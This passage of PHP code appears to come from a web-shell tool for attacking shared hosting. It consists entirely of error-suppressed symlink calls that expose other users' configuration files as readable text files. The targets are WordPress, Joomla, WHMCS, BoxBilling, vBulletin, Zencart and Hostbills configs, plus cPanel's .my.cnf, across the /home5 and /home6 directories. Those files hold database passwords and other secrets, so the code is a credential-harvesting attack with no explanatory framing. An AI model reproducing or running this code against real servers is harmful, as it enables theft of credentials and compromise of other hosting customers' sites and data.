@symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home6

@symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
